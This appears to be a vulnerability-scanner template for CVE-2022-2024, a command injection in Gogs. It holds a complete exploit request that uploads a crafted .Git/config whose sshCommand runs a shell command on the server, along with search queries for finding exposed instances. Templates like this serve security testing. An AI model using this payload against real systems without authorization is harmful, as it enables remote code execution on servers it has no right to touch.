id: CVE-2022-2024

info:
  name: OS Command Injection in Gogs
  author: ProjectDiscoveryAI
  severity: critical
  description: OS Command Injection by bypassing path case sensitivity in Gogs.
  impact: |
    Successful exploitation could lead to remote code execution.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a non-vulnerable version.
  reference:
    - https://huntr.dev/bounties/18cf9256-23ab-4098-a769-85f8da130f97
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-2024
    cwe-id: CWE-78
    epss-score: 0.00373
    epss-percentile: 0.7345
    cpe: cpe:2.3:a:gogs:gogs:*:*:*:*:*:*:*:*
  metadata:
    vendor: gogs
    product: gogs
    shodan-query: title:"Sign In - Gogs"
    fofa-query:
      - title="installation - gogs"
      - title="sign in - gogs"
    google-query:
      - intitle:"installation - gogs"
      - intitle:"sign in - gogs"
  tags: huntr,intrusive

http:
  - method: POST
    path:
      - "{{BaseURL}}/repo/upload"

    headers:
      Content-Type: "application/x-www-form-urlencoded"

    body: |
      tree_path=/.Git/&content=[core]%0Arepositoryformatversion%20=%200%0Afilemode%20=%20true%0Abare%20=%20false%0Alogallrefupdates%20=%20true%0Aignorecase%20=%20true%0Aprecomposeunicode%20=%20true%0AsshCommand%20=%20echo%20pwnned%20>%20/tmp/poc%0A[remote%20"origin"]%0Aurl%20=%20git@github.com:torvalds/linux.git%0Afetch%20=%20+refs/heads/*:refs/remotes/origin/*%0A[branch%20"master"]%0Aremote%20=%20origin%0Amerge%20=%20refs/heads/master
    matchers:
      - type: word
        words:
          - "File uploaded successfully"
        part: body
